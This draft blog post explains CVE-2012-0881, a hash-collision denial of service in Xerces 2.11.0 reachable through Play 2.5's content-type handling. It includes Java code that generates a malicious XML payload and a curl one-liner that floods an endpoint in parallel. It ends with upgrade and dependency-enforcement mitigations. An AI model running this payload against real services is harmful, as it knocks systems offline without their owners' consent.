---
title: "Coerced to make Xerces think"
date: 2018-08-03T23:45:26+01:00
category: ["security"]
draft: true
---

![](/images/coerced_to_make_xerces_think_title.png)

[More]({{< ref "laughing_out_loud_malicious_auth.md" >}}) and [more]({{< ref "hiding_xxe_in_spreadsheets.md" >}})
I'm thinking that XML is evil! This is the third part of my series on why, as a software engineer, it is very useful 
to think about the potentially dangerous combination of outdated libraries and XML.

I recently carried out a review of the dependency scanning results 

[CVE-2012-0881](https://nvd.nist.gov/vuln/detail/CVE-2012-0881):

> Apache Xerces2 Java allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to 
> an XML service, which triggers hash table collisions.

Now, I had come across this previously but wasn't able to find much information about how to create this crafted 
message until talking with talking with members of the [Equal Experts security practice](https://www.equalexperts.com/services/security/) 
led me to find the following two articles:

*   [https://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf](https://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf)
*   [https://stackoverflow.com/q/8669946/227140](https://stackoverflow.com/q/8669946/227140)

That was all the info I needed!

# Whats a hash collision?

Simply put, a hash collision is when two different Strings have the same hashcode.  For strings, hash codes are 
generated using the following method (Java 8):

```java
public int hashCode() {
    int h = hash;
    if (h == 0 && value.length > 0) {
        char val[] = value;

        for (int i = 0; i < value.length; i++) {
            h = 31 * h + val[i];
        }
        hash = h;
    }
    return h;
}
```

So a long (or short string) is reduced to an integer value.  HashMaps and HashSets use those integer values to organise 
the data structure.

# Why are hash collisions bad?

If strings have the same hash code, then a HashMap will store it under the same key in a list.  This means that 
HashMaps are only efficient if the hash codes are sufficiently different. 

# How does this affect XML parsing?

Xerces stores "symbols" (i.e. XML elements, attributes, etc) in a SymbolTable 
([https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java](https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java)) - 
which essentially is a HashMap.

The CCC article describes how forcing a HashMap implementation to deal with collisions can lead to the CPU being spiked 
for quite a while, which makes such things the ideal candidate for Denial of Service attacks.

# The attack

Once I was armed with the knowledge about what hash collisions were and how they could be exploited, I set about creating 
a malicious XML file. I used the information from the stackoverflow article to create a little piece of code to create my malicious file

```java
public static void main(String... args) throws IOException {
    List<String> results = permute(Arrays.asList("Aa", "BB"), 3);
    try (PrintWriter out = new PrintWriter(new FileWriter("test_collision.xml"))) {
        int limit = 1400 * 1024 / format(results.get(0)).length();
        System.out.println("Creating a file with " + results.size() + " entries, limiting to " + limit);
        out.print("<root>");
        results.stream().limit(limit).forEach(e -> out.print(format(e)));
        out.print("</root>");
    }
}

private static String format(String s) {
    return String.format("<%s/>", s);
}

private static List<String> permute(List<String> strings, int iter) {
    List<String> result = new ArrayList<>(strings.size() * strings.size());
    for (String i : strings) {
        for (String j : strings) {
            result.add(i + j);
        }
    }
    if (iter == 0) {
        return result;
    }
    return permute(result, iter - 1);
}
```

this creates an XML file which looks like this

```xml
<?xml version="1.0"?>
<root>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAa/>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaBB/>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaAaBBAa/>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaAaBBBB/>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaBBAaAa/>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaBBAaBB/>
  <AaAaAaAaAaAaAaAaAaAaAaAaAaBBBBAa/>
  ...
</root>
```

Each of the element names have got the same hashcode!

# Attacking File Uploads

I found that anything that processed XML payloads (and was using Xerces 2.11.0) was vulnerable. By uploading as little 
as 5 files with a size of 2MB each simultaneously, I was able to cause a CPU load of 100% for up-to about a minute. 
Sustain this enough and it might cause a rather inconvenient Denial of Service probably without being caught by the 
traditional DDoS protections...

Now, finding applications that allow file uploads isn't that frequent, so how bad could it be?

# Attacking Play

I have been working with Play 2.5 a fair bit recently and found that it too was using Xerces 2.11.0

```shell script
$ sbt "whatDependsOn xerces xercesImpl 2.11.0"
...
[info] xerces:xercesImpl:2.11.0
[info]   +-com.typesafe.play:play_2.11:2.5.13 [S]
[info]     +-com.typesafe.play:filters-helpers_2.11:2.5.12 [S]
[info]     +-com.typesafe.play:play-cache_2.11:2.5.13 [S]
[info]     +-com.typesafe.play:play-logback_2.11:2.5.13 [S]
[info]     +-com.typesafe.play:play-server_2.11:2.5.13 [S]
[info]     +-com.typesafe.play:play-ws_2.11:2.5.13 [S]
```

This means that something in play-2.5 is using an XML library that is vulnerable to the hash collision attack.  
Further digging led me to [https://github.com/playframework/playframework/blob/2.5.x/framework/src/play/src/main/scala/play/api/mvc/ContentTypes.scala#L609-L641](https://github.com/playframework/playframework/blob/2.5.x/framework/src/play/src/main/scala/play/api/mvc/ContentTypes.scala#L609-L641)

```scala
def anyContent(maxLength: Option[Long]): BodyParser[AnyContent] = BodyParser("anyContent") { request =>
  import play.api.libs.iteratee.Execution.Implicits.trampoline

  def maxLengthOrDefault = maxLength.fold(DefaultMaxTextLength)(_.toInt)
  def maxLengthOrDefaultLarge = maxLength.getOrElse(DefaultMaxDiskLength)
  val contentType: Option[String] = request.contentType.map(_.toLowerCase(Locale.ENGLISH))
  contentType match {
    case Some("text/plain") =>
      logger.trace("Parsing AnyContent as text")
      text(maxLengthOrDefault)(request).map(_.right.map(s => AnyContentAsText(s)))

    case Some("text/xml") | Some("application/xml") | Some(ApplicationXmlMatcher()) =>
      logger.trace("Parsing AnyContent as xml")
      xml(maxLengthOrDefault)(request).map(_.right.map(x => AnyContentAsXml(x)))

    case Some("text/json") | Some("application/json") =>
      logger.trace("Parsing AnyContent as json")
      json(maxLengthOrDefault)(request).map(_.right.map(j => AnyContentAsJson(j)))

    case Some("application/x-www-form-urlencoded") =>
      logger.trace("Parsing AnyContent as urlFormEncoded")
      urlFormEncoded(maxLengthOrDefault)(request).map(_.right.map(d => AnyContentAsFormUrlEncoded(d)))

    case Some("multipart/form-data") =>
      logger.trace("Parsing AnyContent as multipartFormData")
      multipartFormData(Multipart.handleFilePartAsTemporaryFile, maxLengthOrDefaultLarge).apply(request)
        .map(_.right.map(m => AnyContentAsMultipartFormData(m)))

    case _ =>
      logger.trace("Parsing AnyContent as raw")
      raw(DefaultMaxTextLength, maxLengthOrDefaultLarge)(request).map(_.right.map(r => AnyContentAsRaw(r)))
  }
}
```

The above code is used by Play to parse any request - this means even if a Play service is not designed to accept XML, 
by passing in a content type of "text/xml" or "application/xml", we can "coerce" the play service to parse the payload.  
The only restriction is that the maximum length of content that will be parsed is DefaultMaxTextLength (which maps to 
the `play.http.parser.maxMemoryBuffer` setting).

This means that I can POST XML to Play Services even if they weren't designed to accept XML!

In my case I found a service that was configured to allow bigger POST payloads than the default of 100K:

```text
play.http.parser.maxMemoryBuffer=1536K
```


So I just fired off a small attack (having asked permission first, of course!)

```shell script
$ seq 1 10 | xargs -n1 -P10 -I{} curl https://vulnerable.service.com/endpoint -d @test_collision.xml -H 'Content-Type: text/xml' -H "X-Iteration: {}"
```

The above fires off 10 requests in parallel - and it wouldn't matter whether the requests are successful or not as 
Play is processing the XML...

And the following was the CPU:

![](/images/coerced_to_make_xerces_think_stats.png)

# The mitigation

The fix was simple - I found that there is a later version of Xerces that had an implementation of SymbolTable that 
changed the hashing algorithm to something other than the standard Java hashing if too many collisions occurred:

Compare:

*   [https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java](https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_11_0/src/org/apache/xerces/util/SymbolTable.java)
*   [https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_12_0/src/org/apache/xerces/util/SymbolTable.java](https://svn.apache.org/repos/asf/xerces/java/tags/Xerces-J_2_12_0/src/org/apache/xerces/util/SymbolTable.java)

So, the fix is to ensure that you've got the following dependency

```sbt
"xerces" % "xercesImpl" % "2.12.0" withSources()
```

or (in Maven land)

```xml
<dependency>
   <groupId>xerces</groupId>
   <artifactId>xercesImpl</artifactId>
   <version>2.12.0</version>
</dependency>
```

Also useful is the enforcer Maven plugin to have to ensure that xerces 2.11.0 doesn't sneak in transitively

```xml
<plugin>
   <groupId>org.apache.maven.plugins</groupId>
   <artifactId>maven-enforcer-plugin</artifactId>
   <version>3.0.0-M1</version>
   <executions>
      <execution>
         <id>enforce-versions</id>
         <goals>
            <goal>enforce</goal>
         </goals>
         <configuration>
            <rules>
               <bannedDependencies>
                  <excludes>
                     <exclude>xerces:xercesImpl:[,2.12.0)</exclude>
                  </excludes>
               </bannedDependencies>
            </rules>
         </configuration>
      </execution>
   </executions>
</plugin>
```

# Moral of the Story

*   Even if you do not design your service to process XML, it may be vulnerable to XML attack vectors
*   Do not use outdated libraries
*   Know what dependencies you are using
*   XML is evil